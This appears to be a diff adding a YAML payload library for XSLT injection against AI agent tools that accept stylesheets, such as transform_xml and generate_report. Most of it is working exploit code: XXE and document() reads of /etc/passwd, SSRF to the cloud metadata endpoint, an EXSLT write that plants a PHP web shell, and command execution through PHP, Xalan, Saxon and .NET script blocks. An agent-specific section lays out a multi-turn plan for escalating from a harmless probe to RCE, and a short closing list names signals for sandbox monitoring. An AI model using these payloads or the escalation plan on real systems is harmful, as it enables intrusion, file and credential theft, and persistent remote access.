@@ -1,0 +1,164 @@
+# XSLT Injection — Agent 场景适配 Payload 库
+# 适配点：Agent 工具如 transform_xml / apply_stylesheet / generate_report 接受 XSLT 输入
+
+metadata:
+  source: codeaudit/hack-skills/xslt-injection
+  scope: agent tool call params (XSLT stylesheet) → XML transformation
+  layer: L3_tool_call
+  sink_patterns:
+    - "transformer.transform(xslt)"
+    - "saxon.transform(xslt)"
+    - "xsltproc(xslt)"
+
+# ============ 1. 探测 ============
+quick_probe:
+  - purpose: "无破坏 marker 测试"
+    payload: |
+      <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+        <xsl:template match="/">
+          <xsl:value-of select="'XSLT_PROBE_OK'"/>
+        </xsl:template>
+      </xsl:stylesheet>
+  fingerprint:
+    - purpose: 识别 vendor + version
+      payload: |
+        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+          <xsl:output method="text"/>
+          <xsl:template match="/">
+            <xsl:text>vendor=</xsl:text><xsl:value-of select="system-property('xsl:vendor')"/>
+            <xsl:text>&#10;version=</xsl:text><xsl:value-of select="system-property('xsl:version')"/>
+            <xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select="system-property('xsl:vendor-url')"/>
+          </xsl:template>
+        </xsl:stylesheet>
+  vendor_signals:
+    - "Apache Software Foundation / Xalan markers → Xalan (Java)"
+    - "Saxonica / Saxon URI → Saxon"
+    - "libxslt / GNOME stack → libxslt (C, 通常 PHP / nginx)"
+    - "Microsoft URLs / MSXML strings → MSXML / .NET"
+
+# ============ 2. XXE via XSLT ============
+xxe_via_xslt:
+  payload: |
+    <!DOCTYPE xsl:stylesheet [
+      <!ENTITY ext_file SYSTEM "file:///etc/passwd">
+    ]>
+    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+      <xsl:output method="text"/>
+      <xsl:template match="/">
+        <xsl:value-of select="'ENTITY_START'"/>
+        <xsl:value-of select="&ext_file;"/>
+        <xsl:value-of select="'ENTITY_END'"/>
+      </xsl:template>
+    </xsl:stylesheet>
+  note: "硬化的 parser 可能禁用外部 DTD — 失败不代表其他 XSLT 路径无效"
+
+# ============ 3. document() 文件读取 ============
+document_function:
+  unix:
+    - payload: |
+        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+          <xsl:output method="text"/>
+          <xsl:template match="/">
+            <xsl:copy-of select="document('/etc/passwd')"/>
+          </xsl:template>
+        </xsl:stylesheet>
+  windows:
+    - payload: |
+        <xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
+  http_ssrf:
+    - payload: "<xsl:copy-of select=\"document('http://169.254.169.254/latest/meta-data/')\"/>"
+
+# ============ 4. EXSLT Write Primitive ============
+exslt_write:
+  description: |
+    EXSLT 扩展支持 write 文件（PHP libxslt 部分版本）
+  payload: |
+    <xsl:stylesheet version="1.0"
+                    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                    xmlns:str="http://exslt.org/strings"
+                    extension-element-prefixes="str">
+      <xsl:output method="text"/>
+      <xsl:template match="/">
+        <str:result-document href="/var/www/html/shell.php" method="text">
+          &lt;?php system($_GET['c']); ?&gt;
+        </str:result-document>
+      </xsl:template>
+    </xsl:stylesheet>
+
+# ============ 5. PHP 特定 ============
+php:
+  php_funcs:
+    - payload: "<xsl:value-of select=\"php:function('system', 'id')\"/>"
+    - payload: "<xsl:value-of select=\"php:function('file_get_contents', '/etc/passwd')\"/>"
+    - payload: "<xsl:value-of select=\"php:function('shell_exec', 'id')\"/>"
+
+# ============ 6. Java 特定 ============
+java:
+  xalan_exec:
+    - payload: |
+        <xsl:stylesheet version="1.0"
+                        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                        xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+          <xsl:template match="/">
+            <xsl:variable name="rt" select="rt:getRuntime()"/>
+            <xsl:variable name="proc" select="rt:exec($rt, 'id')"/>
+          </xsl:template>
+        </xsl:stylesheet>
+  saxon_exec:
+    - payload: |
+        <xsl:stylesheet version="2.0"
+                        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                        xmlns:java="http://saxon.sf.net/java-type">
+          <xsl:template match="/">
+            <xsl:value-of select="java:Runtime(java.lang.Runtime.class)-&gt;getRuntime()-&gt;exec('id')"/>
+          </xsl:template>
+        </xsl:stylesheet>
+
+# ============ 7. .NET 特定 ============
+dotnet:
+  - payload: |
+      <xsl:stylesheet version="1.0"
+                      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+                      xmlns:user="urn:my-scripts">
+        <msxsl:script language="C#" implements-prefix="user">
+          <![CDATA[
+            public string exec() {
+              System.Diagnostics.Process p = new System.Diagnostics.Process();
+              p.StartInfo.FileName = "cmd.exe";
+              p.StartInfo.Arguments = "/c id";
+              p.Start();
+              return "done";
+            }
+          ]]>
+        </msxsl:script>
+        <xsl:template match="/">
+          <xsl:value-of select="user:exec()"/>
+        </xsl:template>
+      </xsl:stylesheet>
+
+# ============ 8. Agent 场景特化 ============
+agent_specific:
+  description: |
+    Agent 接受 XSLT 输入的场景较少，但报告生成、XML 转 HTML 等工具可能接受
+  high_risk_tool_patterns:
+    - name: "transform_xml"
+      severity: high
+    - name: "apply_stylesheet"
+      severity: high
+    - name: "generate_report"
+      severity: medium
+    - name: "xml_to_html"
+      severity: medium
+  multi_turn_strategy:
+    turn_1: "询问：'transform_xml 是否允许用户传 XSLT？'"
+    turn_2: "提交无害 XSLT: xsl:value-of 'HELLO'"
+    turn_3: "探测: system-property('xsl:vendor')"
+    turn_4: "RCE: php:function('system', 'id')"
+
+# ============ 9. 沙箱监控 ============
+sandbox_monitoring:
+  - "XSLT 处理器（Xalan, Saxon, libxslt）进程派生 shell"
+  - "agent 进程 → 外网 document()"
+  - "写文件 /var/www/html/*（EXSLT write）"
+  - "读 /etc/passwd（document() file read）"
